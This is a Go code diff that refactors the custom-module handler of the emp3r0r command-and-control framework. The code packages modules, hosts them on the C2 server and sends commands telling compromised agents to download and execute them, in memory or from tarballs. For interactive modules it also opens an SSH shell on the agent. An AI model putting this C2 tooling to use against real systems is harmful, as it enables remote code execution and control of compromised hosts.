@@ -45,126 +45,139 @@ var ModuleNames = make(map[string]string)
 // moduleCustom run a custom module
 func moduleCustom() {
 	go func() {
-		// get module config
 		config, exists := ModuleConfigs[CurrentMod]
 		if !exists {
 			CliPrintError("Config of %s does not exist", CurrentMod)
 			return
 		}
-		for opt := range config.Options {
-			option, ok := Options[opt]
-			if !ok {
-				CliPrintError("Option '%s' not found", opt)
-				return
-			}
-			config.Options[opt][0] = option.Val
-		}
-		download_addr := ""
-		download_url_opt, ok := Options["download_addr"]
-		if ok {
-			download_addr = download_url_opt.Val
-		}
+
+		updateModuleOptions(&config)
+
+		download_addr := getDownloadAddr()
 
 		payload_type, exec_cmd, envStr, err := genModStartCmd(&config)
 		if err != nil {
 			CliPrintError("Parsing module config: %v", err)
 			return
 		}
+
 		if config.IsInteractive {
-			// we will run the module as shell
 			exec_cmd = "echo 'emp3r0r-interactive-module'"
 		}
 
-		// in-memory module
-		// TODO: handle different scripting languages
 		if config.InMemory {
-			file_to_download := WWWRoot + CurrentMod + ".xz"
-			CliPrintInfo("Compressing %s with xz...", CurrentMod)
-			path := fmt.Sprintf("%s/%s/%s", config.Path, CurrentMod, config.Exec)
-			data, err := os.ReadFile(path)
-			if err != nil {
-				CliPrintError("Reading %s: %v", path, err)
-				return
-			}
-			compressedBytes, err := arc.CompressXz(data)
-			if err != nil {
-				CliPrintError("Compressing %s: %v", path, err)
-				return
-			}
-			err = os.WriteFile(file_to_download, compressedBytes, 0o600)
-			if err != nil {
-				CliPrintError("Writing %s: %v", file_to_download, err)
-				return
-			}
-			cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --in_mem --download_addr %s",
-				emp3r0r_data.C2CmdCustomModule, CurrentMod, payload_type, file_to_download, download_addr)
-			cmd_id := uuid.NewString()
-			err = SendCmdToCurrentTarget(cmd, cmd_id)
-			if err != nil {
-				CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
-			}
+			handleInMemoryModule(config, payload_type, download_addr)
 			return
 		}
 
-		// compress module files
-		tarball_path := WWWRoot + CurrentMod + ".tar.xz"
-		file_to_download := filepath.Base(tarball_path)
-		if !util.IsFileExist(tarball_path) {
-			CliPrintInfo("Compressing %s with tar.xz...", CurrentMod)
-			path := fmt.Sprintf("%s/%s", config.Path, CurrentMod)
-			err = util.TarXZ(path, tarball_path)
-			if err != nil {
-				CliPrintError("Compressing %s: %v", CurrentMod, err)
-				return
-			}
-			CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
-				float64(util.FileSize(tarball_path))/1024/1024, tarball_path, CurrentMod)
-		} else {
-			CliPrintInfo("Using cached %s", tarball_path)
-		}
-
-		// tell agent to download and execute this module
-		checksum := tun.SHA256SumFile(tarball_path)
-		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --download_addr %s --type %s --file_to_download %s --exec \"%s\"",
-			emp3r0r_data.C2CmdCustomModule,
-			CurrentMod, checksum, envStr, download_addr, payload_type, file_to_download, exec_cmd)
-		cmd_id := uuid.NewString()
-		err = SendCmdToCurrentTarget(cmd, cmd_id)
-		if err != nil {
-			CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
-		}
-
-		// interactive module
-		if config.IsInteractive {
-			opt, exists := config.Options["args"]
-			if !exists {
-				config.Options["args"] = []string{"--", "No args"}
-			}
-			args := opt[0]
-			port := strconv.Itoa(util.RandInt(1024, 65535))
-
-			// wait until the module is ready
-			for i := 0; i < 10; i++ {
-				if strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
-					break
-				}
-				time.Sleep(time.Second)
-			}
-			if !strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
-				CliPrintError("%s failed to upload", CurrentMod)
-				return
-			}
-
-			// do it
-			sshErr := SSHClient(fmt.Sprintf("%s/%s/%s",
-				RuntimeConfig.AgentRoot, CurrentMod, config.Exec),
-				args, port, false)
-			if sshErr != nil {
-				CliPrintError("module %s: %v", config.Name, sshErr)
-				return
-			}
-		}
+		handleCompressedModule(config, payload_type, exec_cmd, envStr, download_addr)
 	}()
+}
+
+func updateModuleOptions(config *emp3r0r_data.ModConfig) {
+	for opt := range config.Options {
+		option, ok := Options[opt]
+		if !ok {
+			CliPrintError("Option '%s' not found", opt)
+			return
+		}
+		config.Options[opt][0] = option.Val
+	}
+}
+
+func getDownloadAddr() string {
+	download_url_opt, ok := Options["download_addr"]
+	if ok {
+		return download_url_opt.Val
+	}
+	return ""
+}
+
+func handleInMemoryModule(config emp3r0r_data.ModConfig, payload_type, download_addr string) {
+	hosted_file := WWWRoot + CurrentMod + ".xz"
+	CliPrintInfo("Compressing %s with xz...", CurrentMod)
+	path := fmt.Sprintf("%s/%s/%s", config.Path, CurrentMod, config.Exec)
+	data, err := os.ReadFile(path)
+	if err != nil {
+		CliPrintError("Reading %s: %v", path, err)
+		return
+	}
+	compressedBytes, err := arc.CompressXz(data)
+	if err != nil {
+		CliPrintError("Compressing %s: %v", path, err)
+		return
+	}
+	err = os.WriteFile(hosted_file, compressedBytes, 0o600)
+	if err != nil {
+		CliPrintError("Writing %s: %v", hosted_file, err)
+		return
+	}
+	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s",
+		emp3r0r_data.C2CmdCustomModule, CurrentMod, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
+	cmd_id := uuid.NewString()
+	err = SendCmdToCurrentTarget(cmd, cmd_id)
+	if err != nil {
+		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+	}
+}
+
+func handleCompressedModule(config emp3r0r_data.ModConfig, payload_type, exec_cmd, envStr, download_addr string) {
+	tarball_path := WWWRoot + CurrentMod + ".tar.xz"
+	file_to_download := filepath.Base(tarball_path)
+	if !util.IsFileExist(tarball_path) {
+		CliPrintInfo("Compressing %s with tar.xz...", CurrentMod)
+		path := fmt.Sprintf("%s/%s", config.Path, CurrentMod)
+		err := util.TarXZ(path, tarball_path)
+		if err != nil {
+			CliPrintError("Compressing %s: %v", CurrentMod, err)
+			return
+		}
+		CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
+			float64(util.FileSize(tarball_path))/1024/1024, tarball_path, CurrentMod)
+	} else {
+		CliPrintInfo("Using cached %s", tarball_path)
+	}
+
+	checksum := tun.SHA256SumFile(tarball_path)
+	cmd := fmt.Sprintf("%s --mod_name %s --checksum %s --env \"%s\" --download_addr %s --type %s --file_to_download %s --exec \"%s\"",
+		emp3r0r_data.C2CmdCustomModule,
+		CurrentMod, checksum, envStr, download_addr, payload_type, file_to_download, exec_cmd)
+	cmd_id := uuid.NewString()
+	err := SendCmdToCurrentTarget(cmd, cmd_id)
+	if err != nil {
+		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+	}
+
+	if config.IsInteractive {
+		handleInteractiveModule(config, cmd_id)
+	}
+}
+
+func handleInteractiveModule(config emp3r0r_data.ModConfig, cmd_id string) {
+	opt, exists := config.Options["args"]
+	if !exists {
+		config.Options["args"] = []string{"--", "No args"}
+	}
+	args := opt[0]
+	port := strconv.Itoa(util.RandInt(1024, 65535))
+
+	for i := 0; i < 10; i++ {
+		if strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
+			break
+		}
+		time.Sleep(time.Second)
+	}
+	if !strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
+		CliPrintError("%s failed to upload", CurrentMod)
+		return
+	}
+
+	sshErr := SSHClient(fmt.Sprintf("%s/%s/%s",
+		RuntimeConfig.AgentRoot, CurrentMod, config.Exec),
+		args, port, false)
+	if sshErr != nil {
+		CliPrintError("module %s: %v", config.Name, sshErr)
+	}
 }
 
 // Print module meta data
